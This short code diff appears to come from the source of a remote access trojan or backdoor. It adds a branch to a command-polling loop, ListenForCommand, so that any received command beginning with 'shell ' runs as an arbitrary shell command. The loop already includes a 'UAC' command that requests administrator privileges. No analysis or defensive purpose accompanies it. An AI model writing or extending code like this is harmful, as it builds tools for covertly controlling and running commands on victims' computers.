@@ -66,6 +66,10 @@ void ListenForCommand() {
         else if (cmd == "UAC") {
             RequestAdminPrivileges();
         }
+        else if (cmd.substr(0, 6) == "shell ") {
+            string shellCommand = cmd.substr(6); 
+            ExecuteShellCommand(shellCommand);
+        }
 
         this_thread::sleep_for(chrono::seconds(5));
     }
